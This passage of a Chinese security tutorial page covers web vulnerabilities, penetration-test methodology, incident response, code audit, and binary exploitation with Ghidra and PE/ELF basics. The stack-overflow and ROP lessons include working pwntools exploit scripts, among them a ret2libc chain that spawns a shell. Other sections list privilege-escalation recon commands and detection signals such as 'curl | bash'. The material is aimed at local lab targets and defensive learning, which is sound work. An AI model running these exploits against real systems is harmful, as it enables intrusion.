```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
```

如果业务不需要 XML（比如只用 JSON），**直接不接受 XML** 是最省事的修法。

## 三、反序列化：把数据变成对象

**成因**：把不可信输入直接反序列化成对象，触发魔术方法（`__wakeup`、`readObject`）形成利用链。

判断信号：Cookie、隐藏字段、RPC 参数里出现 base64 长串。

修复：
1. **不反序列化不可信数据**（优先 JSON + 严格 schema）
2. 必须用时，签名校验（HMAC）后再反序列化
3. 组件及时升级（很多链依赖老版本库）

## 四、文件上传：五层校验

| 层 | 校验内容 |
| --- | --- |
| 扩展名 | 白名单，而非黑名单 |
| MIME / Content-Type | 与扩展名一致 |
| 文件头 | 真实魔数（`PNG` 等） |
| 内容 | 图片二次渲染，剥离恶意载荷 |
| 存储 | **存到对象存储/独立域名，禁止解析执行** |

最关键的其实是最后一条：**上传目录不解析脚本**，即便传了 webshell 也执行不了。

## 五、JWT：三个常见攻击面

1. **alg 混淆**：把 `alg` 改成 `none`，或 HMAC/RSA 混用导致公钥当 HMAC 密钥
2. **密钥弱**：弱口令可离线爆破
3. **不校验声明**：不验 `exp`、不验 `aud`、不验签名

修复：服务端**固定算法**、强制验签与验 `exp/iat/aud`、密钥足够强、敏感操作不只看 JWT。

## 六、业务逻辑漏洞（扫不出来的一类）

| 类型 | 例子 | 测试思路 |
| --- | --- | --- |
| 越权 | 改 `userId` 看别人订单 | 水平/垂直越权各测一遍 |
| 支付 | 改金额、改数量为负 | 抓包改参数，看服务端是否重算 |
| 并发 | 优惠券重复领取 | 并发请求同一接口 |
| 流程绕过 | 跳过实名校验直接下单 | 按步骤乱序调用接口 |
| 枚举 | 手机号是否存在 | 对比不同输入的响应差异 |

**核心方法**：把业务流程拆成状态机，逐条边问「如果我不按顺序走会怎样」。

## 七、修复的通用思路

1. **服务端永远重算**：金额、权限、状态都以服务端为准
2. **每个对象都做归属校验**：`WHERE id=? AND owner_id=?`
3. **默认拒绝**：白名单优于黑名单
4. **危险功能隔离**：上传、解析、渲染放到独立服务与独立域名

## 八、练习

1. 在靶场（DVWA / PortSwigger Labs）复现 SSRF 与 XXE，写出修复代码
2. 给你的 demo 写一个「优惠券只能领一次」的接口，用并发脚本验证是否可重复领取
3. 审计一段 JWT 校验代码，找出至少两个缺陷

## 一句话总结

进阶漏洞考的是**想象力 + 对业务的理解**。工具只能覆盖已知模式，剩下的靠你把功能当成攻击面来推演。
</script>


<script type="text/markdown" id="md-sec-pentest">
渗透测试的价值在**报告与改进**，不在「攻进去」这个动作本身。以下七个阶段，缺一环就不算完整项目。

## 一、授权与范围（跳过这步，后面全是法律风险）

必须写进授权书的六项：

1. **目标资产清单**（域名、IP、接口，精确到子域）
2. **测试类型**（黑盒/灰盒/白盒）
3. **时间窗口**（含禁止时段，避免业务高峰）
4. **允许的手段**（是否允许社会工程、是否允许 DoS）
5. **数据处理**（取证数据如何存储、何时销毁）
6. **联系人**（出问题找谁、紧急停止方式）

> 口头同意不算授权。没有书面授权，任何主动测试都不要开始。

## 二、侦察：从资产到入口

把信息收集的产出整理成表（见上一篇），标注每个资产的「暴露面判断」。这一阶段的成果直接决定后面能挖多深。

## 三、漏洞验证：先证明，再利用

**验证**的标准是「可复现的最小证据」：

- 一个能说明问题的响应（报错、数据回显、时间延迟）
- 一张截图 + 完整请求报文
- 明确的前置条件（需要登录？需要特定参数？）

不要一上来就打 `sqlmap --os-shell`——先证明存在注入，再评估影响范围。

## 四、利用与提权：控制影响面

利用的原则：**用最小必要权限证明风险**。

- 拿到数据库读取权限即可，不必拖全库
- 拿到低权限 shell 即可，提权只验证可行性
- 不要在生产环境放后门、不要删改数据

常见提权方向（Linux）：

```bash
id; uname -a; sudo -l                 # 基础信息
find / -perm -4000 -type f 2>/dev/null # SUID 程序
cat /etc/crontab; ls -l /etc/cron.*    # 计划任务
```

Windows 侧关注：服务权限配置错误、未引用服务路径、AlwaysInstallElevated。

## 五、横向：从一台到一片

渗透测试是否「严重」，取决于能否横向。判断依据：

- 是否有域环境/统一认证
- 是否存在可复用的凭据（配置文件、内存、浏览器保存的口令）
- 内网是否有未加固的服务（Redis、数据库、Jenkins）

**注意**：横向必须在授权范围内，且要记录每一步的时间与命令。

## 六、清理与留痕

1. 删除上传的测试文件与临时账号
2. 恢复被修改的配置
3. 保留完整操作日志（时间、命令、结果），作为报告附件
4. 按约定销毁或加密保存取证数据

## 七、报告：决定这次测试值不值钱

一份能推动修复的报告，结构如下：

```
1. 摘要（给管理层看）：整体风险等级、最严重的 3 个问题、建议
2. 范围与方法：测了什么、没测什么、用了什么手段
3. 风险清单（表格）：编号 / 名称 / 等级 / 影响资产 / 状态
4. 详细发现（每个漏洞一页）：
   - 位置（URL / 参数 / 代码行）
   - 复现步骤（可被第三方照做）
   - 影响（能读到什么、能做到什么）
   - 证据（请求响应 / 截图）
   - 修复建议（具体到代码与配置）
5. 附录：工具输出、时间线
```

**写好「修复建议」是分水岭**：写「加强输入校验」没用，写「在 `UserService.java:88` 改用参数化查询，并对 `role` 字段做枚举校验」才有人改。

## 八、常见踩坑

| 坑 | 后果 |
| --- | --- |
| 未确认范围就打内网 | 越界，法律风险 |
| 生产环境跑高强度扫描 | 打挂业务 |
| 只测登录口 | 漏掉 API 与后台 |
| 报告只写「存在高危漏洞」 | 开发不知道怎么改 |
| 不记录时间线 | 出问题无法自证 |

## 九、练习

1. 用 VulnHub 一台靶机做完整流程，产出报告（含摘要、清单、5 个详细发现）
2. 给每个发现写「可执行的修复建议」，并注明验证方式
3. 自己写一份授权书模板，把上面六项都包含进去

## 一句话总结

渗透测试是**用攻击者的视角，产出防守者能执行的清单**。授权是前提，证据是底气，报告是交付物。
</script>


<script type="text/markdown" id="md-sec-defense">
蓝队的核心不是「买设备」，而是**让异常在发生时能被看见**。看不见的攻击，等于没发生。

## 一、日志体系：先有数据，才有分析

四类必收日志：

| 来源 | 关键字段 | 用途 |
| --- | --- | --- |
| 边界（WAF/防火墙/代理） | 源 IP、URL、状态码、规则命中 | 外部攻击尝试 |
| 主机（系统/审计） | 进程、命令行、登录、文件变更 | 落地痕迹 |
| 应用 | 用户、接口、参数、耗时 | 业务异常与越权 |
| 身份（AD/SSO） | 登录成功/失败、MFA、权限变更 | 账号侧入侵 |

三条落地要求：
1. **时间统一（NTP）**：时间不同步，关联分析全废
2. **保留足够久**：至少 90 天，关键日志 180 天以上
3. **集中存储**：本地日志被清是最常见的事后困境

## 二、告警降噪：从「一天三千条」到「十条要看」

降噪的四个手段：

1. **白名单**：已知扫描器、监控探针、内部健康检查
2. **聚合**：同一源 IP 的同类请求合并为一条事件
3. **分级**：按「是否成功、是否涉及敏感资产」分层
4. **基线**：偏离日常行为的才报（如某账号凌晨从境外登录）

告警的价值不在数量，而在**每一条都值得看**。

## 三、ATT&CK：把攻击翻译成可检测的行为

ATT&CK 把攻击拆成战术（为什么）与技术（怎么做）：

| 战术 | 典型技术 | 可检测信号 |
| --- | --- | --- |
| 初始访问 | 公开应用利用、钓鱼 | WAF 命中 + 异常 UA |
| 执行 | 命令行、脚本 | 可疑 `powershell -enc`、`curl \| bash` |
| 持久化 | 计划任务、服务、启动项 | cron 新增、systemd 新服务 |
| 提权 | 内核漏洞、SUID 滥用 | 异常 SUID 文件、sudo 日志 |
| 凭据访问 | 抓内存、读配置 | 访问 `/etc/shadow`、LSASS |
| 横向 | 远程服务、凭据复用 | 内网 SMB/RDP 异常连接 |
| 外传 | C2、云存储 | 非常规域名、大流量出站 |

用它做两件事：**设计检测规则**、**复盘时对齐攻击链**。

## 四、应急响应六步

```
准备 → 识别 → 遏制 → 根除 → 恢复 → 总结
```

**1. 准备**：预案、联系人、取证工具包、隔离手段（能否快速摘掉一台机器）

**2. 识别**：确认「是否真的被入侵」，避免误报搞停业务

**3. 遏制**：先止血。隔离主机、封禁 IP、吊销会话与密钥。**注意保留证据**（内存、磁盘镜像）再清理。

**4. 根除**：找到入口并修掉，否则清完还会再来

**5. 恢复**：从可信备份恢复，改密、加监控，观察一段时间

**6. 总结**：时间线、根因、改进项（每条要有负责人与期限）

## 五、Linux 主机排查顺序（实战）

```bash
# 1. 账号与登录
last -a | head -20
grep -i "accepted\|failed" /var/log/auth.log | tail -50

# 2. 进程与网络
ps auxf --sort=-%cpu | head -20
ss -antp | grep ESTAB

# 3. 持久化
crontab -l; ls -l /etc/cron.*; systemctl list-units --type=service --state=running

# 4. 文件痕迹（按时间找新增）
find / -mtime -3 -type f -newer /etc/hostname 2>/dev/null | head -50

# 5. 启动项与动态库劫持
cat /etc/rc.local 2>/dev/null; ls -l /etc/ld.so.preload
```

排查原则：**先看异常，再看关联**。一个陌生的外连 IP，配合一个 3 天前新增的 cron，往往就是完整故事。

## 六、一次典型入侵的复盘路径

```
WAF 告警：/upload 上传 .jsp
  → 主机日志：/var/www/upload 出现新文件
  → 进程：www-data 启动 /bin/sh
  → 网络：外连 45.x.x.x:443（C2）
  → 持久化：/etc/cron.d/ 新增任务
  → 凭据：/var/www/.env 被读取（数据库口令泄露）
```

每一环都要在日志里有对应证据，缺哪一环就说明**监控有盲区**——这比抓到这次攻击更有价值。

## 七、练习

1. 给你自己的 Linux 主机搭一套最小日志体系（auditd + nginx 日志 + 集中收集）
2. 写 5 条 ATT&CK 对应的检测规则（伪代码即可），并说明误报来源
3. 模拟一次「Webshell 上传」事件，按六步流程写处置记录

## 一句话总结

蓝队的能力等于**可见性 × 响应速度**。日志不全就没有可见性，预案不练就没有速度。
</script>


<script type="text/markdown" id="md-sec-code-audit">
渗透测试是「事后发现」，代码审计与安全开发是「事前拦截」。后者才是成本最低的防线。

## 一、审计四条主线

拿到一个项目，不要从第一行读起。按四条线找：

**1. 输入线**：所有外部输入进到哪
```
HTTP 参数 → Controller → Service → DAO / 执行 / 文件
```

**2. 认证与授权线**：谁能做什么
```
登录 → 会话 → 每个接口的权限注解/校验 → 数据归属校验
```

**3. 文件与命令线**：哪里碰了系统
```
上传、下载、解压、模板渲染、执行命令、反序列化
```

**4. 依赖线**：用了什么
```
pom.xml / package.json / requirements.txt → 已知漏洞版本
```

## 二、危险函数清单（按语言）

| 语言 | 危险点 | 安全替代 |
| --- | --- | --- |
| Java | `Statement` 拼接 SQL、`Runtime.exec`、`ObjectInputStream` | `PreparedStatement`、参数数组、JSON + 签名 |
| Python | `eval/exec`、`pickle.loads`、`subprocess(..., shell=True)` | `ast.literal_eval`、JSON、参数列表 |
| PHP | `eval`、`include $_GET`、`system` | 白名单包含、参数化 |
| Node | `child_process.exec`、`eval`、`innerHTML` | `execFile`、模板转义 |
| 通用 | 字符串拼接 SQL / 路径拼接 | 参数化、`os.path.join` + 规范化校验 |

看到这些函数不等于有漏洞，但**每一个都要追问「参数从哪来」**。

## 三、一个真实审计片段

```java
// 危险：id 来自请求参数，直接拼进 SQL
String sql = "SELECT * FROM orders WHERE id = " + request.getParameter("id");
stmt.executeQuery(sql);

// 修复
String sql = "SELECT * FROM orders WHERE id = ? AND user_id = ?";
try (PreparedStatement ps = conn.prepareStatement(sql)) {
    ps.setLong(1, Long.parseLong(id));
    ps.setLong(2, currentUserId());     // 归属校验同样重要
    ps.executeQuery();
}
```

审计时要同时看两件事：**注入**与**越权**。很多代码修了前者，忘了后者。

## 四、SAST / DAST / SCA 怎么配合

| 类型 | 看什么 | 优点 | 局限 |
| --- | --- | --- | --- |
| SAST（静态） | 源码模式 | 早、覆盖全 | 误报多，看不到运行时 |
| DAST（动态） | 运行中接口 | 真实、误报少 | 覆盖依赖用例 |
| SCA（依赖） | 第三方组件版本 | 快、可直接修 | 只管已知 CVE |
| 人工审计 | 业务逻辑 | 能发现逻辑漏洞 | 慢，依赖经验 |

**推荐顺序**：SCA（每次提交）→ SAST（每次 PR）→ DAST（每次发布前）→ 人工审计（核心模块 + 上线前）。

## 五、把检查嵌进 CI

```yaml
# 示例：GitHub Actions
- name: 依赖扫描
  run: pip install pip-audit && pip-audit
- name: 静态扫描
  run: pip install bandit && bandit -r src -ll
- name: 密钥扫描
  run: |
    pip install detect-secrets
    detect-secrets scan --baseline .secrets.baseline
```

三条原则：
1. **只拦「高置信 + 高危」**，否则团队会全量忽略
2. **基线管理**：历史问题进 baseline，新增问题才阻断
3. **修复有归属**：每个告警指定负责人，否则永远不修

## 六、安全开发的三条硬规矩

1. **服务端不信任任何输入**：包括前端校验过的、内部服务传的
2. **权限校验写在数据访问层**：`WHERE owner_id = ?`，而不是只在 Controller 判断
3. **密钥不进代码库**：`.env` 加 `.gitignore`，CI 用 Secrets，泄露立即轮换

## 七、练习

1. 找一个开源 Web 项目，按四条主线做一次审计，产出「发现清单 + 修复 PR」
2. 给你自己的项目配 SCA + SAST，让它在 PR 上自动评论
3. 写一份《安全开发检查清单》，覆盖输入、认证、文件、依赖、日志五块

## 一句话总结

安全开发的本质是**把安全检查变成流程的一部分**，而不是靠某个人记得。流程能持续，个人会疲劳。
</script>


<script type="text/markdown" id="md-bin-stack-overflow">
栈溢出不是「写多了几个字节」，而是**写入越过了缓冲区边界，覆盖了控制流数据**。要理解它，先得看懂栈帧。

## 一、x86-64 的函数调用约定

调用 `func(a, b)` 时：

```
参数：rdi=a, rsi=b, rdx, rcx, r8, r9（前六个用寄存器，其余压栈）
返回：rax
调用者保存：rax rcx rdx rsi rdi r8-r11
被调用者保存：rbx rbp r12-r15
```

进入函数后的标准序言（prologue）：

```asm
push rbp          ; 保存调用者的栈基址
mov  rbp, rsp     ; 建立当前帧
sub  rsp, 0x40    ; 为局部变量分配 0x40 字节
```

于是栈上的布局（高地址在下）：

```
+------------------+ 高地址
| 调用者的栈帧        |
+------------------+
| 返回地址 (8 字节)   |  ← rbp+8，函数返回时 rip 从这里取
+------------------+
| 保存的 rbp (8 字节) |  ← rbp
+------------------+
| 局部变量 / 缓冲区   |  ← rbp-0x40
+------------------+ 低地址  ← rsp
```

**关键点**：缓冲区在低地址，返回地址在它上方。往缓冲区里写超出长度的数据，超过的部分会依次覆盖「保存的 rbp」和「返回地址」。

## 二、为什么 gets / strcpy 危险

```c
void vulnerable(void) {
    char buf[32];
    gets(buf);          /* 不限长度，一直读到换行 */
}
```

`gets` 不知道 `buf` 有多长。输入 40 个字符：前 32 个填满缓冲区，接着 8 个覆盖保存的 rbp，再 8 个覆盖返回地址。

函数 `ret` 时，CPU 从栈上弹出返回地址装载到 `rip`——**控制流就被劫持了**。

## 三、算偏移：三个方法

1. **数汇编**：看 `sub rsp, 0x??` 与缓冲区相对 rbp 的位置
2. **看反汇编**：`objdump -d -M intel ./vuln | less`，找 `lea rax, [rbp-0x30]` 这类指令
3. **cyclic 模式**（pwntools）：发一段有规律的字符，崩溃时看 `rip` 的值能算出精确偏移

```python
from pwn import *
payload = cyclic(200)
# 崩溃后看核心转储里 rip 的值，例如 0x6161616c
print(cyclic_find(0x6161616c))   # 得到偏移
```

## 四、最小复现（仅本地靶场）

```c
// gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln
#include <stdio.h>
void win(void) { puts("控制流已被劫持"); }
void vuln(void) {
    char buf[64];
    gets(buf);
}
int main(void) { vuln(); return 0; }
```

关闭保护是为了**先理解原理**。真实环境里 Canary、NX、PIE 会逐个拦住你——这正是后面两篇要讲的。

```python
from pwn import *
elf = ELF('./vuln')
p = process('./vuln')
p.sendline(b'A' * 72 + p64(elf.symbols['win']))   # 64 缓冲 + 8 保存rbp
p.interactive()
```

## 五、栈溢出的现代变体

| 类型 | 特点 |
| --- | --- |
| 返回地址覆盖 | 最经典，需绕过 Canary/NX/PIE |
| 栈上 shellcode | 需要可执行栈（`-z execstack`），现代系统基本没有 |
| ret2libc | 跳到 libc 里的 `system("/bin/sh")` |
| ret2csu / ROP | 拼 gadget 绕过 NX（见下一篇） |
| 格式化字符串 | 任意地址读写，常与栈溢出配合 |

## 六、防御侧怎么写

1. **永不使用** `gets` / `strcpy` / `sprintf` / `strcat`
2. 用 `fgets(buf, sizeof buf, stdin)` / `snprintf` / `strncpy` 并保证结尾 `\0`
3. 编译加 `-fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie`
4. 关键服务开启 `RELRO` 与 `ASLR`
5. 用静态分析（`clang --analyze`、`cppcheck`）扫出危险调用

## 七、练习

1. 在本地编译上面那个 `vuln.c`，用 `cyclic` 算出精确偏移
2. 打开 `-fstack-protector` 重新编译，观察崩溃信息变成 `*** stack smashing detected ***`
3. 用 `gdb` 在 `ret` 前下断点，观察 `rsp` 指向的值如何变成你的 payload

## 一句话总结

栈溢出 = **数据越界 + 控制流数据在数据上方**。看懂栈帧布局，才知道为什么偏移是「缓冲大小 + 8」，也才知道每一层保护在拦什么。
</script>


<script type="text/markdown" id="md-bin-protections">
保护机制的目标不是「不可能被利用」，而是**让利用从「写几行 payload」变成「需要多个前置条件」**。

## 一、先学会看：checksec

```bash
checksec --file=./vuln
# 或 pwntools 里：pwn checksec ./vuln
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

这四行决定了你的攻击路线。

## 二、NX（No-eXecute）：栈不可执行

**原理**：页表里给栈/堆标记「不可执行」，跳过去就触发段错误。

**拦住了**：`ret2shellcode`（把 shellcode 放栈上再跳过去）。

**绕过思路**：
- **ret2libc**：跳到已有代码（libc 的 `system`）
- **ROP**：拼已有指令片段（下一篇）
- **mprotect**：调用 `mprotect` 把某段内存改成可执行

**防御价值**：极高。它逼攻击者从「写代码」变成「复用代码」。

## 三、ASLR / PIE：地址随机化

**ASLR**（系统级）：每次进程启动，栈、堆、libc 的基址随机。
**PIE**（编译级）：可执行文件本身也随机加载。

**拦住了**：硬编码地址的 payload。

**绕过思路**：
1. **信息泄露**：先读出一个地址（格式化字符串、越界读），算出基址
2. **部分覆盖**：只改地址低 2 字节（页内偏移随机性小）
3. **爆破**：32 位系统熵低时可行（约 1/4096）
4. **不随机的东西**：`vsyscall`、某些未开 PIE 的模块

```bash
cat /proc/sys/kernel/randomize_va_space   # 2 = 完全开启
```

## 四、Canary：栈上的哨兵

**原理**：函数返回前检查栈上一个随机值（末尾通常是 `\x00`）是否被改。

```asm
mov rax, fs:0x28      ; 取 canary
mov [rbp-0x8], rax    ; 放到栈上
...
cmp rax, [rbp-0x8]    ; 返回前比较
jne __stack_chk_fail
```

**拦住了**：直接覆盖返回地址（会先踩坏 canary）。

**绕过思路**：
1. **泄露 canary**：格式化字符串、越界读
2. **不覆盖 canary**：只覆盖它上面的数据（如局部指针）
3. **爆破**：fork 型服务 canary 不变，可逐字节猜（最多 7 字节）

## 五、RELRO：保护 GOT 表

GOT 是「函数名 → 真实地址」的表。改写 GOT 就能劫持函数调用。

| 级别 | 效果 |
| --- | --- |
| No RELRO | GOT 可写 |
| Partial RELRO | `.got.plt` 仍可写（默认） |
| Full RELRO | 启动时全部解析并只读，GOT 不可写 |

**Full RELRO 拦住了**：GOT 覆写类攻击。

## 六、组合起来的难度梯度

| 组合 | 典型利用 |
| --- | --- |
| 无保护 | ret2shellcode |
| NX | ret2libc / ROP |
| NX + Canary | 先泄露 canary，再 ROP |
| NX + Canary + PIE + ASLR | 需要泄露地址 + canary + gadget，链变长 |
| 以上 + Full RELRO | 只能打栈上 ROP 或 FSOP / 堆利用 |

这就是为什么 CTF 的 Pwn 题按保护给难度。

## 七、防御侧怎么开

```bash
# 编译期
gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 \
    -fPIE -pie -Wl,-z,relro,-z,now prog.c -o prog

# 系统级
echo 2 > /proc/sys/kernel/randomize_va_space
```

再配合：
- **CET / Shadow Stack**（硬件控制流保护）
- **seccomp** 限制系统调用
- **ASan** 在测试环境发现越界

## 八、练习

1. 用同一份 `vuln.c` 编译四份：全关、只开 NX、开 NX+Canary、全开，分别 `checksec` 并记录
2. 对开 Canary 的版本，用 gdb 观察 `__stack_chk_fail` 触发路径
3. 找一道开了 Full RELRO 的靶场题，说明为什么 GOT 覆写走不通

## 一句话总结

每个保护机制都在**增加一个必须解决的前置条件**。Pwn 的功力，就体现在「能不能把这些条件逐个拆掉」。
</script>


<script type="text/markdown" id="md-bin-rop">
ROP（Return-Oriented Programming）的核心思想一句话：**既然不能执行我写的代码，那就用你已有的代码片段拼出我要的逻辑**。

## 一、gadget 是什么

一段以 `ret` 结尾的短指令序列，位于程序或 libc 里：

```asm
pop rdi ; ret          ; 把栈顶弹到 rdi，然后返回
pop rsi ; pop r15 ; ret
mov [rdi], rsi ; ret
syscall ; ret
```

`ret` 的语义是「从栈顶取地址并跳过去」。把一串 gadget 地址连续摆在栈上，`ret` 就会一个个串起来执行——这就是 **ROP 链**。

## 二、为什么必须靠 gadget

x86-64 下调用 `system("/bin/sh")` 需要：

```
rdi = 指向 "/bin/sh" 的地址
rip = system 的地址
```

但我们**没法直接赋值寄存器**（栈不可执行）。所以需要 `pop rdi ; ret` 这样的片段：它从栈上取一个值放进 `rdi`，正好满足需要。

## 三、找 gadget

```bash
ROPgadget --binary ./vuln | grep "pop rdi"
ropper --file ./vuln --search "pop rdi"
```

pwntools 里更省事：

```python
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())
```

## 四、构造一条最小链

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

POP_RDI = 0x4011f3                 # pop rdi ; ret（ROPgadget 找到的）
RET     = 0x40101a                 # 单独一个 ret，用于栈对齐

payload  = b'A' * 72               # 覆盖到返回地址
payload += p64(RET)                # 16 字节对齐（movaps 崩溃时加）
payload += p64(POP_RDI) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])    # 泄露 puts 的真实地址
payload += p64(elf.symbols['main'])  # 泄露后回到 main，再来一轮

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
print(hex(libc_base))
```

拿到 libc 基址后，第二轮直接：

```python
payload  = b'A' * 72
payload += p64(RET)
payload += p64(POP_RDI) + p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + libc.symbols['system'])
```

**两步走的原因**：ASLR 下 libc 基址未知，必须先泄露一次真实地址。

## 五、ret2csu：没有 pop rdi 怎么办

有些程序里找不到 `pop rdi ; ret`。这时用 `__libc_csu_init` 里的两段代码：

```asm
; gadget 1
mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call [r15 + rbx*8]
; gadget 2
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```

它们能一次设置三个参数，是「缺 gadget 时的通用备胎」。

## 六、ret2dlresolve 与 SROP（了解即可）

| 技术 | 适用场景 |
| --- | --- |
| ret2csu | 缺 pop 系列 gadget |
| ret2dlresolve | 程序没有 `system@plt`，需要动态解析符号 |
| SROP | 能控制 `rax` 与触发信号，用 `sigreturn` 一次性设置所有寄存器 |
| JOP/COP | 不以 ret 结尾的变体，绕过 CET 时会用 |

## 七、栈对齐：最常见的坑

调用 libc 函数时若 `rsp` 不是 16 字节对齐，`movaps` 会崩（`SIGSEGV` 在 `system+...`）。解法是在链里多插一个 `ret`：

```python
payload += p64(RET)        # 只为了 +8 字节
```

这个坑几乎每个人都会踩一次。

## 八、防御侧怎么看

1. **Full RELRO + CET** 会显著提高链构造难度
2. **限制 gadget 数量**：编译选项、去除无用代码
3. **seccomp**：即使拿到 shell，也只能做允许的系统调用
4. **检测**：异常 `ret` 频率、栈上大量地址序列（可用 eBPF/IDS 观察）

## 九、练习

1. 用 `ROPgadget` 在一道开了 NX 的靶场题里找齐 `pop rdi / pop rsi / pop rdx`
2. 手写一条 ret2libc 链，先只泄露地址，再第二轮拿 shell
3. 故意不加对齐 `ret`，观察 `movaps` 崩溃，理解为什么要对齐

## 一句话总结

ROP 的本质是**把「函数调用」降级成「地址 + 寄存器填充」**。理解调用约定 + 会找 gadget，就能拼出任何单次调用；剩下的都是组合与泄露的艺术。
</script>


<script type="text/markdown" id="md-bin-ghidra">
静态分析的价值：**在不运行样本的前提下，理解它的结构与意图**。Ghidra 免费、跨平台、反编译质量足够日常使用。

## 一、快速上手五步

```bash
# 需要 JDK 21+
ghidraRun          # 启动 GUI
```

1. **New Project** → Non-Shared → 建工程
2. **File → Import File** 导入样本（ELF / PE / 固件都行）
3. 双击打开，Ghidra 自动做 **Auto Analysis**（识别函数、字符串、导出表）
4. 看 **Symbol Tree**：Functions / Imports / Exports / Strings
5. 从 `entry` 与 `main` 开始读

命令行侧可用 `analyzeHeadless` 批量跑（后面给例子）。

## 二、读懂入口链路

```
entry  →  __libc_start_main(main, ...)
```

Ghidra 一般会自动识别 `main`。若没识别，从 `entry` 里找传给 `__libc_start_main` 的第一个参数，重命名成 main。

**第一个阅读顺序建议**：

1. `main` 里的分支（通常是命令行参数或菜单）
2. 字符串引用（`Strings` 窗口 → 双击 → 看交叉引用）
3. 导入函数（`Imports`：`recv`/`send` 说明有网络，`CreateFile` 说明有文件操作）

## 三、四种高频操作

**1. 交叉引用（XREF）**

按 `Ctrl+Shift+F` 搜字符串，或双击字符串 → 看 `References to`。这是「从证据反推逻辑」最快的方法。

**2. 还原结构体**

反编译里出现 `*(int *)(param_1 + 0x10)` 时，右键 → `Auto Create Structure`，Ghidra 会推断字段布局。

**3. 重命名**

`L` 重命名变量/函数。把 `FUN_00401a20` 改成 `check_license` 的那一刻，可读性会有质变。**边读边改名**是逆向的核心习惯。

**4. 修改函数签名**

右键 → `Edit Function Signature`，指定参数类型（如 `char *`），反编译输出会立刻清晰。

## 四、一个典型逆向片段

```c
undefined8 check(char *input) {
  size_t len = strlen(input);
  if (len != 16) return 0;
  for (int i = 0; i < 16; i++) {
    if ((input[i] ^ 0x2a) != expected[i]) return 0;   // 逐字节异或比较
  }
  return 1;
}
```

看到这种结构，结论很直接：**密钥就是 `expected` 数组与 0x2a 异或**。静态分析的威力就在这里——不用运行就能写出解密脚本。

## 五、与其他工具配合

| 场景 | 工具 | 用途 |
| --- | --- | --- |
| 快速看字符串 | `strings -a -n 6 bin` | 找 URL、路径、提示语 |
| 看段与权限 | `readelf -S` / `objdump -h` | 判断是否有可执行段 |
| 看反汇编 | `objdump -d -M intel` | 核对 Ghidra 的翻译 |
| 看依赖 | `ldd` / `readelf -d` | 判断用了哪些库 |
| 动态跟进 | `gdb` + `pwndbg` | 验证静态推断 |

**静态 + 动态结合**：静态给出假设，动态验证假设。

## 六、批量分析（脚本化）

```bash
analyzeHeadless /tmp/proj myproj -import sample.bin \
  -postScript ExportFunctions.java -deleteProject
```

可以写 Java/Python 脚本自动导出「函数列表 + 调用的 API + 字符串」，适合样本量大的场景。

## 七、常见障碍与对策

| 现象 | 可能原因 | 对策 |
| --- | --- | --- |
| 函数体是乱的 | 被壳/混淆 | 先脱壳（见下一篇） |
| 找不到 main | stripped + 非标准启动 | 从 `__libc_start_main` 参数找 |
| 全是 `FUN_xxx` | 无符号表 | 按调用关系与常数推断 |
| 反编译报错 | 不支持的指令 / 花指令 | 用汇编视图，或先 patch 掉花指令 |

## 八、纪律提醒

静态分析的对象常常是**恶意样本**。请在隔离环境（断网虚拟机）里操作，不要在生产机或宿主机直接打开样本；分析结论只用于防护与研判。

## 九、练习

1. 拿一道 CrackMe，用 Ghidra 找到校验函数，写出注册机
2. 对一个 stripped 的 ELF，通过 `strings` 的交叉引用定位主要逻辑
3. 用 `analyzeHeadless` 导出某二进制的全部导入函数与字符串

## 一句话总结

Ghidra 不是「自动告诉你答案」的工具，它是**让你读得更快的放大镜**。方法永远是：找证据（字符串/API/常数）→ 追引用 → 改名 → 还原结构 → 写结论。
</script>


<script type="text/markdown" id="md-rev-pe-elf">
可执行文件不是「一堆机器码」，它是一份**带地图的装载说明书**。看懂地图，才知道程序从哪开始、依赖什么、代码在哪一段。

## 一、ELF（Linux）的结构

```
┌─────────────┐
│ ELF Header  │ 魔数 ELF、架构、入口地址、段表偏移
├─────────────┤
│ Program Headers │ 给加载器看：哪些段要映射到内存、权限如何
├─────────────┤
│ .text       │ 代码
│ .rodata     │ 只读数据（字符串常量）
│ .data       │ 已初始化全局变量
│ .bss        │ 未初始化全局变量（不占文件空间）
│ .plt / .got │ 动态链接跳转与地址表
│ .init/.fini │ 初始化/收尾代码
├─────────────┤
│ Section Headers │ 给链接器/工具看：节名称与偏移
└─────────────┘
```

两个关键区分：

- **段（Segment）** 给加载器用：决定内存权限（r-x / rw-）
- **节（Section）** 给工具用：`.text` `.data` 只是段内的划分

```bash
readelf -h ./a.out      # 头部：入口地址、架构
readelf -l ./a.out      # 段：LOAD 段的权限
readelf -S ./a.out      # 节：每节的大小与偏移
readelf -d ./a.out      # 动态依赖
```

## 二、PE（Windows）的结构

```
DOS Header (MZ) → DOS Stub → NT Headers (PE␀␀)
  ├ File Header（机器类型、节数量）
  └ Optional Header（入口 RVA、ImageBase、数据目录）
Section Table → .text .rdata .data .rsrc .reloc
```

| 概念 | 含义 |
| --- | --- |
| RVA | 相对虚拟地址（相对 ImageBase） |
| VA | 虚拟地址 = ImageBase + RVA |
| File Offset | 文件里的偏移，与 RVA 不同（要按节换算） |
| 数据目录 | 导入表、导出表、重定位、TLS、资源的位置 |

**RVA 与文件偏移的换算**是 PE 分析的基本功，几乎所有「找不到字符串」的困惑都来自这里。

用 PEBear / CFF Explorer 打开最直观：左侧树形结构，点「导入表」直接列出依赖的 DLL 与函数。

## 三、导入表：程序会做什么的最快线索

```bash
objdump -p ./a.out | grep -A20 "DLL Name"
```

看到这些 API 就能大致判断行为：

| API | 说明 |
| --- | --- |
| `VirtualAlloc` + `WriteProcessMemory` | 常见于注入 |
| `CreateRemoteThread` | 远程线程注入 |
